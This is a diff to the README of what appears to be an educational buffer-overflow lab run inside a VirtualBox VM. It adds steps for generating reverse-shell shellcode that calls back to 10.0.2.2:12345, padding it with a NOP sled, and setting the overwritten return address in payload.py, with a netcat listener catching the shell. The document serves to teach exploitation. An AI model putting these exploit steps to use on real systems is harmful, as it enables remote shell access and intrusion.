@@ -36,6 +36,19 @@
 ## VM configuration:
 - add port-forwarding for ssh-server and socket-server in VirtualBox
 
+## Generate your payload!
+
+We used (http://shell-storm.org/shellcode/files/shellcode-907.php)[this code] to generate our payload. This python script generates a payload with the ip and port of the client which we would be listening through.
+
+```
+def sockaddr():
+    # Change this
+    IP = "10.0.2.2" # modify this in the code!
+    PORT = 12345	# modify this in the code!
+```
+
+Remember to add nop slope to the byte code after code generation for easier hacking. Refer to payload.py to observe where the nop slope is added.
+
 
 ## Step by step instruction on creating the exploit
 
@@ -45,7 +58,7 @@
 - a C compiler (we are using gcc version 5.4.0)
 - gdb
 
-
+### Steps:
 1. Clone from the repo
 
 ```
@@ -255,7 +268,8 @@ Program received signal SIGSEGV, Segmentation fault.
 
 We want to modify our payload so it goes to the top of our nop slide, which we found to be at 0x7fffffffd460. 
 
-We go into the payload and modify the return address to correspond to the right location. 0x7fffffffd460 are 6 bytes in total, but the return pointer in a 64-bit system is 8 bytes long, so what we really want to inject is 0x00007fffffffd464 (added 4 bytes just to be sure). So we accordingly change our python payload script:
+We go into the payload and modify the return address to correspond to the right location. 0x7fffffffd460 are 6 bytes in total, but the return pointer in a 64-bit system is 8 bytes long, so what we really want to inject is 0x00007fffffffd464 (added 4 bytes just to be sure). So we  change our python payload script accordingly:
+
 ```
 $ cat payload.py
 # ret_addr = b"\x00\x00\x7f\xff\xff\xff\xdb\x40"[::-1] // Code from before
@@ -273,10 +287,9 @@ buf += b"\x90"*(136-len(buf)) + ret_addr
 
 print(buf)
 ```
-The injected shellcode in this example tries to connect and forward a shell over TCP to IP address 10.0.2.2 (standard Gateway IP on a Virtualbox VM) on port 12345. So, before you deliver the payload, you would want to use netcat to listen for the reverse shell.
+The injected shellcode in this example tries to connect and forward a shell over TCP to IP address 10.0.2.2 (standard Gateway IP on a Virtualbox VM) on port 12345. So, before you deliver the payload, you would want to use netcat to listen for the reverse shell. To modify the IP address and port of the forwarding target, please see the section "Generate Your Payload!" for more details.
 
-8. Try it again! Exploit should work now
-
+8. Try it again! Exploit should work now outside of gdb.
 
 ## Takeaway
 
